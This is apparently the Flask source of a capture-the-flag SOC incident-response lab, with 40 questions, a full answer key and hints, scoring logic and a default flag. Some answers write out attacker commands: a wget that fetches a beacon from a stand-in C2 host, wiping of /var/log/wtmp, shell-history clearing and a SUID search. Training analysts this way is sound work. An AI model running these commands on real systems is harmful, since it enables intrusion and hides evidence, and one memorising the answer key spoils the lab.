"""
Stadium FC — SOC Analyst Lab
40-question incident-response lab. Score >= 70% (28/40) to pass.
Sequential mode: 3 attempts per question, next unlocks on correct or lockout.
"""
from __future__ import annotations
import os, secrets
from pathlib import Path
from flask import Flask, render_template, request, session, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
_flag_file = Path(__file__).resolve().parent / "flag.txt"
FLAG = os.environ.get("FLAG") or (_flag_file.read_text().strip() if _flag_file.exists() else "INFODAYS{SaamNoLimits_soc_analyst_certified_deadbeef}")
EVIDENCE = Path(__file__).resolve().parent / "evidence"
MAX_ATTEMPTS = 3

# ── 40 Questions ─────────────────────────────────────────────────
# Each: (id, category, difficulty, question, answer, hint)
# Answers are case-insensitive; pipes separate alternatives.
QUESTIONS = [
    # ── EASY (1–15): IOC extraction, basic log reading ──────────
    ("q1",  "IOC", "Easy",
     "What is the primary attacker IP address seen in auth.log performing SSH brute-force?",
     "185.196.8.23",
     "Look at the Failed password entries in auth.log."),
    ("q2",  "IOC", "Easy",
     "What is the secondary attacker IP address seen in firewall.log performing port scans?",
     "91.215.85.142",
     "Check the iptables DROP entries in firewall.log."),
    ("q3",  "IOC", "Easy",
     "What username did the attacker create on the jumpbox after gaining root?",
     "ops_manager",
     "Look for useradd entries in auth.log or syslog."),
    ("q4",  "IOC", "Easy",
     "What is the IP address of the jumpbox (the initial target)?",
     "10.10.10.10",
     "Look at the DST field in firewall.log SSH ACCEPT entries."),
    ("q5",  "IOC", "Easy",
     "What port was targeted during the SSH brute-force attack?",
     "22",
     "Standard SSH port — confirmed by firewall.log DPT field."),
    ("q6",  "IOC", "Easy",
     "What is the name of the webshell file uploaded by the attacker?",
     "cmd.php",
     "Check access.log for POST /upload and subsequent requests to /uploads/."),
    ("q7",  "IOC", "Easy",
     "What User-Agent string did the attacker use during web reconnaissance?",
     "Mozilla/5.0 (X11; Linux) StadiumBot/1.0",
     "Look at the User-Agent field in access.log for the attacker's IP."),
    ("q8",  "IOC", "Easy",
     "What is the C2 domain the attacker's beacon connected to?",
     "c2.stadium-ops.example",
     "Check DNS queries from the internal web server or the wget command in access.log."),
    ("q9",  "IOC", "Easy",
     "What IP does the C2 domain resolve to?",
     "194.26.135.89",
     "Check dns_queries.log for the A record resolution."),
    ("q10", "IOC", "Easy",
     "What port does the C2 beacon communicate on?",
     "4444",
     "Look at the DPT in firewall.log or the wget URL in access.log."),
    ("q11", "IOC", "Easy",
     "What is the full path of the webshell on the compromised web server?",
     "/var/www/html/uploads/cmd.php|/uploads/cmd.php",
     "Combine the web root with the upload path from access.log."),
    ("q12", "IOC", "Easy",
     "What is the IP address of the internal web server?",
     "10.10.10.50",
     "Look at SRC fields for outbound C2 connections in firewall.log."),
    ("q13", "IOC", "Easy",
     "What domain was used for data exfiltration?",
     "paste.darkleaf.cc",
     "Check dns_queries.log or syslog for curl POST targets."),
    ("q14", "IOC", "Easy",
     "What is the date of the incident (YYYY-MM-DD)?",
     "2026-03-15",
     "Check any timestamp in the evidence files."),
    ("q15", "IOC", "Easy",
     "What SQL injection payload was used in the first SQLi attempt? (just the operator after the quote)",
     "OR 1=1|or 1=1|OR 1=1 UNION SELECT",
     "Check access.log for /search?q= requests."),

    # ── MEDIUM (16–30): log correlation, attack chain, MITRE ────
    ("q16", "Analysis", "Medium",
     "How many failed SSH login attempts were made before the successful brute-force login?",
     "22",
     "Count Failed password entries in auth.log before the Accepted line."),
    ("q17", "Analysis", "Medium",
     "At what time (HH:MM:SS) did the attacker successfully log in via SSH?",
     "03:47:24",
     "Look for 'Accepted password for root' in auth.log."),
    ("q18", "Analysis", "Medium",
     "What Suricata signature detected the SQL injection attack? (signature name)",
     "ET WEB_SERVER SQL Injection Attempt -- UNION SELECT",
     "Check suricata.json for signature_id 2006546."),
    ("q19", "Analysis", "Medium",
     "What Suricata signature ID detected the SSH scanning activity?",
     "2001219",
     "Check suricata.json for the first alert."),
    ("q20", "Analysis", "Medium",
     "What is the full path of the cron-based persistence mechanism installed by the attacker?",
     "/etc/cron.d/.sysupdate",
     "Check syslog for REPLACE entries related to crontab."),
    ("q21", "Analysis", "Medium",
     "What is the full path of the systemd service used for persistence?",
     "/etc/systemd/system/stadium-telemetry.service",
     "Check syslog for 'Created symlink' entries."),
    ("q22", "Analysis", "Medium",
     "What MITRE ATT&CK technique ID describes the initial access method (password brute-force)?",
     "T1110.001|T1110",
     "Brute Force: Password Guessing."),
    ("q23", "Analysis", "Medium",
     "What MITRE ATT&CK technique ID describes the persistence via cron?",
     "T1053.003|T1053",
     "Scheduled Task/Job: Cron."),
    ("q24", "Analysis", "Medium",
     "From which host did the attacker laterally move to the web server?",
     "10.10.10.10|jumpbox",
     "Check auth.log for SSH connections to webserver — note the source IP."),
    ("q25", "Analysis", "Medium",
     "What command did the attacker run via sudo to search for SUID binaries?",
     "/usr/bin/find / -perm -u=s|find / -perm -u=s",
     "Check auth.log or syslog for sudo commands by the compromised user."),
    ("q26", "Analysis", "Medium",
     "What file was exfiltrated by the attacker? (full path)",
     "/tmp/.stage/matchdata.tar.gz.enc",
     "Check syslog for curl POST commands with --data-binary."),
    ("q27", "Analysis", "Medium",
     "What Suricata alert category was assigned to the C2 beacon activity?",
     "A Network Trojan was detected",
     "Check suricata.json for alerts to the C2 IP."),
    ("q28", "Analysis", "Medium",
     "What sensitive file from the web root was exposed to the attacker during recon? (path that exposes git config)",
     ".git/config|/.git/config",
     "Check access.log for 200 responses to common sensitive file paths."),
    ("q29", "Analysis", "Medium",
     "What Suricata signature detected the data exfiltration?",
     "ET POLICY curl User-Agent to External IP -- Possible Data Exfiltration",
     "Check suricata.json for alerts around the exfiltration timestamp."),
    ("q30", "Analysis", "Medium",
     "How many DGA domains were observed in DNS queries?",
     "3",
     "Count distinct .biz domains in dns_queries.log that look randomly generated."),

    # ── HARD (31–40): deep analysis, timeline, remediation ──────
    ("q31", "Advanced", "Hard",
     "List all three DGA domains observed, comma-separated in chronological order.",
     "xk3mf9a2.biz, q7hnwp4e.biz, r2djc8v1.biz|xk3mf9a2.biz,q7hnwp4e.biz,r2djc8v1.biz",
     "Check dns_queries.log for suspicious .biz domains."),
    ("q32", "Advanced", "Hard",
     "What anti-forensics technique did the attacker use to clear login records? (command)",
     "rm -rf /var/log/wtmp|rm /var/log/wtmp",
     "Check syslog for file deletion commands near the end of the timeline."),
    ("q33", "Advanced", "Hard",
     "What anti-forensics command was used to clear shell history?",
     "history -c && history -w|history -c",
     "Check syslog for history-related commands."),
    ("q34", "Advanced", "Hard",
     "What MITRE ATT&CK technique ID corresponds to the privilege escalation via sudo abuse?",
     "T1548.003|T1548",
     "Abuse Elevation Control: Sudo and Sudo Caching."),
    ("q35", "Advanced", "Hard",
     "What is the MITRE ATT&CK technique ID for the lateral movement via SSH?",
     "T1021.004|T1021",
     "Remote Services: SSH."),
    ("q36", "Advanced", "Hard",
     "What is the total time span (in minutes) from first SSH brute-force attempt to data exfiltration?",
     "12",
     "From 03:40 (first scan) to 03:52 (curl POST exfil)."),
    ("q37", "Advanced", "Hard",
     "What Suricata signature ID detected the webshell command execution?",
     "2008284",
     "Check suricata.json for PHP Webshell alerts."),
    ("q38", "Advanced", "Hard",
     "What command did the attacker use via the webshell to download the beacon? (full wget command)",
     "wget http://c2.stadium-ops.example:4444/beacon -O /tmp/beacon",
     "Decode the cmd= parameter from the webshell request in access.log."),
    ("q39", "Advanced", "Hard",
     "What is the IP address of the database server (internal network)?",
     "10.10.10.51",
     "Check the timeline.csv or consider the internal network scheme: .10 jumpbox, .50 web, .51 db."),
    ("q40", "Advanced", "Hard",
     "Reconstruct the kill chain: list the 5 attack phases in order (initial access, persistence, lateral movement, privilege escalation, exfiltration). What MITRE technique ID was used for exfiltration?",
     "T1048.003|T1048",
     "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol."),
]


def _init_session():
    if "state" not in session:
        session["state"] = {
            "current": 0,
            "attempts": {},
            "results": {},
        }


def _check_answer(qindex: int, user_ans: str) -> bool:
    _, _, _, _, answer, _ = QUESTIONS[qindex]
    for alt in answer.split("|"):
        if user_ans.strip().lower() == alt.strip().lower():
            return True
    return False


@app.route("/")
def index():
    _init_session()
    evidence_files = {}
    for f in sorted(EVIDENCE.iterdir()):
        if f.is_file():
            evidence_files[f.name] = f.read_text()
    q_data = []
    for i, (qid, cat, diff, question, answer, hint) in enumerate(QUESTIONS):
        q_data.append({
            "id": qid,
            "num": i + 1,
            "category": cat,
            "difficulty": diff,
            "question": question,
            "hint": hint,
        })
    return render_template("index.html", questions=q_data, evidence=evidence_files,
                           total=len(QUESTIONS), max_attempts=MAX_ATTEMPTS)


@app.route("/api/state")
def api_state():
    _init_session()
    st = session["state"]
    return jsonify({
        "current": st["current"],
        "results": st["results"],
        "attempts": st["attempts"],
        "total": len(QUESTIONS),
        "max_attempts": MAX_ATTEMPTS,
    })


@app.route("/api/answer", methods=["POST"])
def api_answer():
    _init_session()
    st = session["state"]
    data = request.get_json(force=True)
    qindex = data.get("q")
    user_ans = data.get("answer", "").strip()

    if qindex is None or qindex != st["current"]:
        return jsonify({"error": "invalid question"}), 400
    if qindex >= len(QUESTIONS):
        return jsonify({"error": "lab complete"}), 400

    qid = QUESTIONS[qindex][0]
    used = st["attempts"].get(qid, 0)
    if used >= MAX_ATTEMPTS:
        return jsonify({"error": "locked"}), 400
    if qid in st["results"]:
        return jsonify({"error": "already answered"}), 400
    if not user_ans:
        return jsonify({"error": "empty answer"}), 400

    used += 1
    st["attempts"][qid] = used
    correct = _check_answer(qindex, user_ans)

    if correct:
        st["results"][qid] = "correct"
        st["current"] = qindex + 1
        session.modified = True
        return jsonify({"status": "correct", "attempts_left": MAX_ATTEMPTS - used, "next": st["current"]})

    if used >= MAX_ATTEMPTS:
        st["results"][qid] = "locked"
        st["current"] = qindex + 1
        session.modified = True
        return jsonify({"status": "locked", "attempts_left": 0, "next": st["current"]})

    session.modified = True
    return jsonify({"status": "wrong", "attempts_left": MAX_ATTEMPTS - used})


@app.route("/api/skip", methods=["POST"])
def api_skip():
    """Allow skipping — burns all remaining attempts."""
    _init_session()
    st = session["state"]
    data = request.get_json(force=True)
    qindex = data.get("q")
    if qindex is None or qindex != st["current"]:
        return jsonify({"error": "invalid"}), 400
    if qindex >= len(QUESTIONS):
        return jsonify({"error": "lab complete"}), 400
    qid = QUESTIONS[qindex][0]
    if qid not in st["results"]:
        st["results"][qid] = "locked"
        st["attempts"][qid] = MAX_ATTEMPTS
    st["current"] = qindex + 1
    session.modified = True
    return jsonify({"status": "skipped", "next": st["current"]})


@app.route("/api/finish")
def api_finish():
    _init_session()
    st = session["state"]
    score = sum(1 for v in st["results"].values() if v == "correct")
    total = len(QUESTIONS)
    pct = round(score / total * 100)
    passed = pct >= 70
    return jsonify({
        "score": score,
        "total": total,
        "pct": pct,
        "passed": passed,
        "flag": FLAG if passed else None,
        "results": st["results"],
    })


@app.route("/api/reset", methods=["POST"])
def api_reset():
    session.pop("state", None)
    return jsonify({"status": "reset"})


@app.route("/submit", methods=["POST"])
def submit():
    """Solver-compatible: accept all 40 answers at once, return flag in HTML."""
    score = 0
    for i, (qid, cat, diff, question, answer, hint) in enumerate(QUESTIONS):
        user_ans = request.form.get(qid, "").strip()
        for alt in answer.split("|"):
            if user_ans.lower() == alt.strip().lower():
                score += 1
                break
    total = len(QUESTIONS)
    pct = round(score / total * 100)
    passed = pct >= 70
    flag = FLAG if passed else None
    return render_template("result.html",
                           score=score, total=total, pct=pct,
                           passed=passed, flag=flag, results=[])


@app.route("/evidence/<filename>")
def evidence_file(filename):
    fpath = EVIDENCE / filename
    if not fpath.is_file():
        return "Not found", 404
    return fpath.read_text(), 200, {"Content-Type": "text/plain; charset=utf-8"}


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
